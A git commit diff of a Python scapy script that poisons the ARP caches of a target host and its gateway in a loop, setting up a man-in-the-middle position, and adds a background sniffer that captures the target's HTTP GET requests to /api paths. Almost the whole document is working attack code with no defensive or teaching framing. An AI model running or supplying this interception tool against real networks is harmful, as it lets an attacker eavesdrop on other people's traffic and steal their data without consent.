6c6b283dd0c6aca050c15a9a0cac76dc90d4e63c
Charmeister11 <tsutavicius@gmail.com>
2023-06-09 10:51:14 +0200

    Version 2 with auto packet capture

--- main.py
+++ main.py
@@ -1,25 +1,32 @@
-import time
 from scapy.all import *
 from scapy.layers.l2 import ARP, Ether
+from scapy.layers.http import HTTPRequest
+from scapy.sendrecv import sniff
 
 
 def arp_spoof(target_ip, spoof_ip, interface='YOUR_INTERFACE'):
-    # Get the MAC address of the target
     target_mac = get_mac(target_ip)
-
-    # Create an ARP "is-at" packet to say spoof_ip is at my MAC address
     packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-
-    # Send the packet
     sendp(packet, iface=interface, verbose=False)
 
 
 def get_mac(ip):
-    # Send an ARP "who-has" request to get the MAC of ip
     response, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=2, retry=10, verbose=False)
-    # Return the MAC address from the response
     for _, packet in response:
         return packet[Ether].src
+
+
+def sniff_packets(interface='Wi-Fi'):
+    def process_packet(packet):
+        if packet.haslayer(HTTPRequest):
+            # Check if it's an HTTP GET request
+            if packet[HTTPRequest].Method.decode() == 'GET':
+                # Check if the Path starts with '/api'
+                if packet[HTTPRequest].Path.decode().startswith('/api'):
+                    print("[*] HTTP GET Packet Captured with URI starting with /api:", packet.summary())
+
+    print("Starting packet sniffing...")
+    sniff(iface=interface, store=False, prn=process_packet, filter="tcp port 80")
 
 
 # Use the IP addresses relevant to your network
@@ -27,13 +34,14 @@ target_ip = "192.168.1.5"
 gateway_ip = "192.168.1.247"
 interface = "Wi-Fi"
 
+# Start the packet sniffer in a separate thread
+sniffer_thread = threading.Thread(target=sniff_packets, args=(interface,), daemon=True)
+sniffer_thread.start()
+
 try:
     while True:
-        # Tell the target that we are the gateway
         arp_spoof(target_ip, gateway_ip, interface)
-        # Tell the gateway that we are the target
         arp_spoof(gateway_ip, target_ip, interface)
-        # Sleep for a bit
         time.sleep(10)
 except KeyboardInterrupt:
     print("ARP spoofing stopped.")
